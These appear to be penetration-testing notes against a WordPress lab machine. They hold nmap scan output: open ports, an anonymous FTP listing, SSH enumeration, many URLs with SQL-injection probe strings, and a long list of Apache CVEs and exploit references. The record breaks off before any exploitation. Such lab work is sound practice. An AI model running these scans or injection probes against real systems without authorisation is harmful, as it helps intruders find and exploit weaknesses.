# HF 2019 Notes

In this file, there are all bunch of notes and attempts to exploit this machine

## Analysis

We can already see that it is a Word Press website from the information we gather from the website

### nmap

```bash
    $ nmap -p- -T4 10.0.0.18

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 05:24 EST
    Nmap scan report for 10.0.0.18
    Host is up (0.014s latency).
    Not shown: 65531 closed tcp ports (reset)
    PORT      STATE SERVICE
    21/tcp    open  ftp
    22/tcp    open  ssh
    80/tcp    open  http
    10000/tcp open  snet-sensor-mgmt
```

#### Port 21 - FTP

```bash
    $ nmap -p 21 --script=ftp-anon,ftp-syst 10.0.0.18

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 05:28 EST
    Nmap scan report for 10.0.0.18
    Host is up (0.0027s latency).

    PORT   STATE SERVICE
    21/tcp open  ftp
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | -rw-rw-r--    1 ftp      ftp           420 Nov 30  2017 index.php
    | -rw-rw-r--    1 ftp      ftp         19935 Sep 05  2019 license.txt
    | -rw-rw-r--    1 ftp      ftp          7447 Sep 05  2019 readme.html
    | -rw-rw-r--    1 ftp      ftp          6919 Jan 12  2019 wp-activate.php
    | drwxrwxr-x    9 ftp      ftp          4096 Sep 05  2019 wp-admin
    | -rw-rw-r--    1 ftp      ftp           369 Nov 30  2017 wp-blog-header.php
    | -rw-rw-r--    1 ftp      ftp          2283 Jan 21  2019 wp-comments-post.php
    | -rw-rw-r--    1 ftp      ftp          3255 Sep 27  2019 wp-config.php
    | drwxrwxr-x    8 ftp      ftp          4096 Nov 12 22:59 wp-content
    | -rw-rw-r--    1 ftp      ftp          3847 Jan 09  2019 wp-cron.php
    | drwxrwxr-x   20 ftp      ftp         12288 Sep 05  2019 wp-includes
    | -rw-rw-r--    1 ftp      ftp          2502 Jan 16  2019 wp-links-opml.php
    | -rw-rw-r--    1 ftp      ftp          3306 Nov 30  2017 wp-load.php
    | -rw-rw-r--    1 ftp      ftp         39551 Jun 10  2019 wp-login.php
    | -rw-rw-r--    1 ftp      ftp          8403 Nov 30  2017 wp-mail.php
    | -rw-rw-r--    1 ftp      ftp         18962 Mar 28  2019 wp-settings.php
    | -rw-rw-r--    1 ftp      ftp         31085 Jan 16  2019 wp-signup.php
    | -rw-rw-r--    1 ftp      ftp          4764 Nov 30  2017 wp-trackback.php
    |_-rw-rw-r--    1 ftp      ftp          3068 Aug 17  2018 xmlrpc.php
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to 10.0.1.12
    |      Logged in as ftp
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 2
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
```

#### Port 22 - SSH

```bash
    $ nmap -p 22 --script=ssh-hostkey,ssh-auth-methods,ssh2-enum-algos 10.0.0.18

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 05:29 EST
    Nmap scan report for 10.0.0.18
    Host is up (0.030s latency).

    PORT   STATE SERVICE
    22/tcp open  ssh
    | ssh-hostkey: 
    |   2048 b7:2e:8f:cb:12:e4:e8:cd:93:1e:73:0f:51:ce:48:6c (RSA)
    |   256 70:f4:44:eb:a8:55:54:38:2d:6d:75:89:bb:ec:7e:e7 (ECDSA)
    |_  256 7c:0e:ab:fe:53:7e:87:22:f8:5a:df:c9:da:7f:90:79 (ED25519)
    | ssh-auth-methods: 
    |   Supported authentication methods: 
    |     publickey
    |     password
    |_    keyboard-interactive
    | ssh2-enum-algos: 
    |   kex_algorithms: (10)
    |       curve25519-sha256
    |       curve25519-sha256@libssh.org
    |       ecdh-sha2-nistp256
    |       ecdh-sha2-nistp384
    |       ecdh-sha2-nistp521
    |       diffie-hellman-group-exchange-sha256
    |       diffie-hellman-group16-sha512
    |       diffie-hellman-group18-sha512
    |       diffie-hellman-group14-sha256
    |       diffie-hellman-group14-sha1
    |   server_host_key_algorithms: (5)
    |       ssh-rsa
    |       rsa-sha2-512
    |       rsa-sha2-256
    |       ecdsa-sha2-nistp256
    |       ssh-ed25519
    |   encryption_algorithms: (6)
    |       chacha20-poly1305@openssh.com
    |       aes128-ctr
    |       aes192-ctr
    |       aes256-ctr
    |       aes128-gcm@openssh.com
    |       aes256-gcm@openssh.com
    |   mac_algorithms: (10)
    |       umac-64-etm@openssh.com
    |       umac-128-etm@openssh.com
    |       hmac-sha2-256-etm@openssh.com
    |       hmac-sha2-512-etm@openssh.com
    |       hmac-sha1-etm@openssh.com
    |       umac-64@openssh.com
    |       umac-128@openssh.com
    |       hmac-sha2-256
    |       hmac-sha2-512
    |       hmac-sha1
    |   compression_algorithms: (2)
    |       none
    |_      zlib@openssh.com
```

#### Port 80 - HTTP

```bash
    $ nmap -sV -p 80 --script=http-title,http-server-header,http-headers,http-methods,http-enum,vuln 10.0.0.18

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 05:31 EST
    Nmap scan report for 10.0.0.18
    Host is up (0.0055s latency).

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    | http-sql-injection: 
    |   Possible sqli for queries:
    |     http://10.0.0.18:80/index.php?rest_route=%2F%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/underscore.min.js?ver=1.8.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-content/themes/twentyseventeen/style.css?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/backbone.min.js?ver=1.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/api-request.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?m=201909%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?feed=comments-rss2%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?cat=1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?feed=rss2%27%20OR%20sqlspider
    |     http://10.0.0.18:80/xmlrpc.php?rsd=%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/wp-embed.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/wp-api.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?p=1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-content/plugins/wp-google-maps/wpgmza_data.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/index.php?rest_route=%2F%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/underscore.min.js?ver=1.8.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-content/themes/twentyseventeen/style.css?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/backbone.min.js?ver=1.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/api-request.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?m=201909%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?feed=comments-rss2%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?cat=1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?feed=rss2%27%20OR%20sqlspider
    |     http://10.0.0.18:80/xmlrpc.php?rsd=%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/wp-embed.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/wp-api.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?p=1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-content/plugins/wp-google-maps/wpgmza_data.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?feed=comments-rss2%27%20OR%20sqlspider
    |     http://10.0.0.18:80/index.php?rest_route=%2F%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?feed=rss2%27%20OR%20sqlspider&=
    |     http://10.0.0.18:80/?feed=rss2&=%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/underscore.min.js?ver=1.8.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-content/themes/twentyseventeen/style.css?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/backbone.min.js?ver=1.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/api-request.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?feed=comments-rss2%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?cat=1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?feed=rss2%27%20OR%20sqlspider
    |     http://10.0.0.18:80/xmlrpc.php?rsd=%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/wp-embed.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/wp-includes/js/wp-api.min.js?ver=5.2.3%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?p=1%27%20OR%20sqlspider
    |     http://10.0.0.18:80/?m=201909%27%20OR%20sqlspider
    |_    http://10.0.0.18:80/wp-content/plugins/wp-google-maps/wpgmza_data.js?ver=5.2.3%27%20OR%20sqlspider
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-title: Tata intranet &#8211; Just another WordPress site
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.25: 
    |       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
    |       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
    |       HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6  9.8     https://vulners.com/httpd/HTTPD:E8492EE5729E8FB514D3C0EE370C9BC6
    |       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
    |       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
    |       HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D  9.8     https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
    |       HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8  9.8     https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
    |       HTTPD:9AD76A782F4E66676719E36B64777A7A  9.8     https://vulners.com/httpd/HTTPD:9AD76A782F4E66676719E36B64777A7A
    |       HTTPD:650C6B8A1FEAD1FBD1AF9746142659F9  9.8     https://vulners.com/httpd/HTTPD:650C6B8A1FEAD1FBD1AF9746142659F9
    |       HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E  9.8     https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
    |       HTTPD:1F84410918227CC81FA7C000C4F999A3  9.8     https://vulners.com/httpd/HTTPD:1F84410918227CC81FA7C000C4F999A3
    |       HTTPD:156974A46CA46AF26CC4140D00F7EB10  9.8     https://vulners.com/httpd/HTTPD:156974A46CA46AF26CC4140D00F7EB10
    |       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
    |       D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52    9.8     https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52  *EXPLOIT*
    |       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
    |       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
    |       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
    |       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
    |       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
    |       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
    |       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
    |       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
    |       CVE-2021-26691  9.8     https://vulners.com/cve/CVE-2021-26691
    |       CVE-2018-1312   9.8     https://vulners.com/cve/CVE-2018-1312
    |       CVE-2017-7679   9.8     https://vulners.com/cve/CVE-2017-7679
    |       CVE-2017-3169   9.8     https://vulners.com/cve/CVE-2017-3169
    |       CVE-2017-3167   9.8     https://vulners.com/cve/CVE-2017-3167
    |       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
    |       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
    |       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
    |       CNVD-2022-41640 9.8     https://vulners.com/cnvd/CNVD-2022-41640
    |       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
    |       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
    |       B6297446-2DDD-52BA-B508-29A748A5D2CC    9.8     https://vulners.com/githubexploit/B6297446-2DDD-52BA-B508-29A748A5D2CC  *EXPLOIT*
    |       64A540A8-D918-5BEA-8F60-987F97B27A0C    9.8     https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C  *EXPLOIT*
    |       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
    |       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B  *EXPLOIT*
    |       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
    |       1337DAY-ID-38427        9.8     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
    |       0DB60346-03B6-5FEE-93D7-FF5757D225AA    9.8     https://vulners.com/gitee/0DB60346-03B6-5FEE-93D7-FF5757D225AA  *EXPLOIT*
    |       HTTPD:D868A1E68FB46E2CF5486281DCDB59CF  9.1     https://vulners.com/httpd/HTTPD:D868A1E68FB46E2CF5486281DCDB59CF
    |       HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6  9.1     https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
    |       HTTPD:3512E3F62E72F03B59F5E9CF8ECB3EEF  9.1     https://vulners.com/httpd/HTTPD:3512E3F62E72F03B59F5E9CF8ECB3EEF
    |       HTTPD:2C227652EE0B3B961706AAFCACA3D1E1  9.1     https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
    |       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F  *EXPLOIT*
    |       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7  *EXPLOIT*
    |       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89  *EXPLOIT*
    |       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45  *EXPLOIT*
    |       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
    |       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
    |       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
    |       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
    |       CVE-2019-10082  9.1     https://vulners.com/cve/CVE-2019-10082
    |       CVE-2017-9788   9.1     https://vulners.com/cve/CVE-2017-9788
    |       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
    |       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
    |       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
    |       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
    |       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D  *EXPLOIT*
    |       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A  *EXPLOIT*
    |       HTTPD:1B3D546A8500818AAC5B1359FE11A7E4  9.0     https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
    |       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    9.0     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
    |       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
    |       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
    |       CNVD-2023-30860 9.0     https://vulners.com/cnvd/CNVD-2023-30860
    |       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
    |       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C  *EXPLOIT*
    |       9D9B3F4D-6B5C-5377-BE39-F1C432C9E457    9.0     https://vulners.com/githubexploit/9D9B3F4D-6B5C-5377-BE39-F1C432C9E457  *EXPLOIT*
    |       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
    |       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2  *EXPLOIT*
    |       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F  *EXPLOIT*
    |       D6E5CEC7-9ED8-5F96-A93E-768E2674DBCB    8.8     https://vulners.com/githubexploit/D6E5CEC7-9ED8-5F96-A93E-768E2674DBCB  *EXPLOIT*
    |       3F71F065-66D4-541F-A813-9F1A2F2B1D91    8.8     https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91  *EXPLOIT*
    |       HTTPD:A7133572D328CD65C350E33F20834FAD  8.2     https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
    |       CVE-2021-44224  8.2     https://vulners.com/cve/CVE-2021-44224
    |       CNVD-2021-102387        8.2     https://vulners.com/cnvd/CNVD-2021-102387
    |       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38  *EXPLOIT*
    |       HTTPD:B63E69E936F944F114293D6F4AB8D4D6  8.1     https://vulners.com/httpd/HTTPD:B63E69E936F944F114293D6F4AB8D4D6
    |       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
    |       CVE-2017-15715  8.1     https://vulners.com/cve/CVE-2017-15715
    |       249A954E-0189-5182-AE95-31C866A057E1    8.1     https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1  *EXPLOIT*
    |       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5  *EXPLOIT*
    |       HTTPD:4CB68AD1C4AC4E8EE009A960A68B7E65  7.8     https://vulners.com/httpd/HTTPD:4CB68AD1C4AC4E8EE009A960A68B7E65
    |       HTTPD:109158785130C454EF1D1CDDD4417560  7.8     https://vulners.com/httpd/HTTPD:109158785130C454EF1D1CDDD4417560
    |       EDB-ID:46676    7.8     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
    |       DF041B2B-2DA7-5262-AABE-9EBD2D535041    7.8     https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041  *EXPLOIT*
    |       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
    |       CVE-2019-0211   7.8     https://vulners.com/cve/CVE-2019-0211
    |       CNVD-2019-08946 7.8     https://vulners.com/cnvd/CNVD-2019-08946
    |       706A08EF-16F2-59B5-B98E-EB8B83215AB1    7.8     https://vulners.com/gitee/706A08EF-16F2-59B5-B98E-EB8B83215AB1  *EXPLOIT*
    |       PACKETSTORM:211124      7.5     https://vulners.com/packetstorm/PACKETSTORM:211124      *EXPLOIT*
    |       PACKETSTORM:181038      7.5     https://vulners.com/packetstorm/PACKETSTORM:181038      *EXPLOIT*
    |       MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED- 7.5     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_OPTIONSBLEED-  *EXPLOIT*
    |       HTTPD:F6C47B71D440F1A5B8EC9883D1516A33  7.5     https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
    |       HTTPD:F42C3F30D72C7F0EAB800B29D17B0701  7.5     https://vulners.com/httpd/HTTPD:F42C3F30D72C7F0EAB800B29D17B0701
    |       HTTPD:F1CFBC9B54DFAD0499179863D36830BB  7.5     https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
    |       HTTPD:D9B9375C40939357C5F47F1B3F64F0A1  7.5     https://vulners.com/httpd/HTTPD:D9B9375C40939357C5F47F1B3F64F0A1
    |       HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43  7.5     https://vulners.com/httpd/HTTPD:D5C9AD5E120B9B567832B4A5DBD97F43
    |       HTTPD:CEEECD1BF3428B58C39137059390E4A1  7.5     https://vulners.com/httpd/HTTPD:CEEECD1BF3428B58C39137059390E4A1
    |       HTTPD:C7D6319965E27EC08FB443D1FD67603B  7.5     https://vulners.com/httpd/HTTPD:C7D6319965E27EC08FB443D1FD67603B
    |       HTTPD:C317C7138B4A8BBD54A901D6DDDCB837  7.5     https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
    |       HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F  7.5     https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
    |       HTTPD:B1B0A31C4AD388CC6C575931414173E2  7.5     https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
    |       HTTPD:975FD708E753E143E7DFFC23510F802E  7.5     https://vulners.com/httpd/HTTPD:975FD708E753E143E7DFFC23510F802E
    |       HTTPD:708DA551D11D790335A6621D3875C0F4  7.5     https://vulners.com/httpd/HTTPD:708DA551D11D790335A6621D3875C0F4
    |       HTTPD:63F2722DB00DBB3F59C40B40F32363B3  7.5     https://vulners.com/httpd/HTTPD:63F2722DB00DBB3F59C40B40F32363B3
    |       HTTPD:6236A32987BAE49DFBF020477B1278DD  7.5     https://vulners.com/httpd/HTTPD:6236A32987BAE49DFBF020477B1278DD
    |       HTTPD:60420623F2A716909480F87DB74EE9D7  7.5     https://vulners.com/httpd/HTTPD:60420623F2A716909480F87DB74EE9D7
    |       HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5  7.5     https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
    |       HTTPD:5A19AF8A0AFEFB7E187025740EEC094C  7.5     https://vulners.com/httpd/HTTPD:5A19AF8A0AFEFB7E187025740EEC094C
    |       HTTPD:05E6BF2AD317E3658D2938931207AA66  7.5     https://vulners.com/httpd/HTTPD:05E6BF2AD317E3658D2938931207AA66
    |       EDB-ID:52426    7.5     https://vulners.com/exploitdb/EDB-ID:52426      *EXPLOIT*
    |       EDB-ID:42745    7.5     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
    |       EDB-ID:40909    7.5     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT*
    |       E5C174E5-D6E8-56E0-8403-D287DE52EB3F    7.5     https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F  *EXPLOIT*
    |       DB6E1BBD-08B1-574D-A351-7D6BB9898A4A    7.5     https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A  *EXPLOIT*
    |       D228B59B-465A-509D-A681-012DB9348698    7.5     https://vulners.com/githubexploit/D228B59B-465A-509D-A681-012DB9348698  *EXPLOIT*
    |       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
    |       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
    |       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
    |       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
    |       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
    |       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
    |       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
    |       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
    |       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
    |       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
    |       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
    |       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
    |       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
    |       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
    |       CVE-2021-34798  7.5     https://vulners.com/cve/CVE-2021-34798
    |       CVE-2021-33193  7.5     https://vulners.com/cve/CVE-2021-33193
    |       CVE-2021-26690  7.5     https://vulners.com/cve/CVE-2021-26690
    |       CVE-2020-9490   7.5     https://vulners.com/cve/CVE-2020-9490
    |       CVE-2020-11993  7.5     https://vulners.com/cve/CVE-2020-11993
    |       CVE-2019-10081  7.5     https://vulners.com/cve/CVE-2019-10081
    |       CVE-2019-0217   7.5     https://vulners.com/cve/CVE-2019-0217
    |       CVE-2018-8011   7.5     https://vulners.com/cve/CVE-2018-8011
    |       CVE-2018-17199  7.5     https://vulners.com/cve/CVE-2018-17199
    |       CVE-2018-1333   7.5     https://vulners.com/cve/CVE-2018-1333
    |       CVE-2018-1303   7.5     https://vulners.com/cve/CVE-2018-1303
    |       CVE-2017-9798   7.5     https://vulners.com/cve/CVE-2017-9798
    |       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
    |       CVE-2017-7659   7.5     https://vulners.com/cve/CVE-2017-7659
    |       CVE-2017-15710  7.5     https://vulners.com/cve/CVE-2017-15710
    |       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
    |       CNVD-2025-16614 7.5     https://vulners.com/cnvd/CNVD-2025-16614
    |       CNVD-2025-16613 7.5     https://vulners.com/cnvd/CNVD-2025-16613
    |       CNVD-2025-16612 7.5     https://vulners.com/cnvd/CNVD-2025-16612
    |       CNVD-2025-16609 7.5     https://vulners.com/cnvd/CNVD-2025-16609
    |       CNVD-2025-16608 7.5     https://vulners.com/cnvd/CNVD-2025-16608
    |       CNVD-2024-36393 7.5     https://vulners.com/cnvd/CNVD-2024-36393
    |       CNVD-2024-36390 7.5     https://vulners.com/cnvd/CNVD-2024-36390
    |       CNVD-2024-36389 7.5     https://vulners.com/cnvd/CNVD-2024-36389
    |       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
    |       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
    |       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
    |       CNVD-2022-53584 7.5     https://vulners.com/cnvd/CNVD-2022-53584
    |       CNVD-2022-51058 7.5     https://vulners.com/cnvd/CNVD-2022-51058
    |       CNVD-2022-41639 7.5     https://vulners.com/cnvd/CNVD-2022-41639
    |       CNVD-2022-13199 7.5     https://vulners.com/cnvd/CNVD-2022-13199
    |       CNVD-2022-03223 7.5     https://vulners.com/cnvd/CNVD-2022-03223
    |       CNVD-2020-46281 7.5     https://vulners.com/cnvd/CNVD-2020-46281
    |       CNVD-2020-46279 7.5     https://vulners.com/cnvd/CNVD-2020-46279
    |       CNVD-2019-41283 7.5     https://vulners.com/cnvd/CNVD-2019-41283
    |       CNVD-2019-08945 7.5     https://vulners.com/cnvd/CNVD-2019-08945
    |       CNVD-2017-13906 7.5     https://vulners.com/cnvd/CNVD-2017-13906
    |       CNVD-2016-12036 7.5     https://vulners.com/cnvd/CNVD-2016-12036
    |       CNVD-2016-04600 7.5     https://vulners.com/cnvd/CNVD-2016-04600
    |       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29  *EXPLOIT*
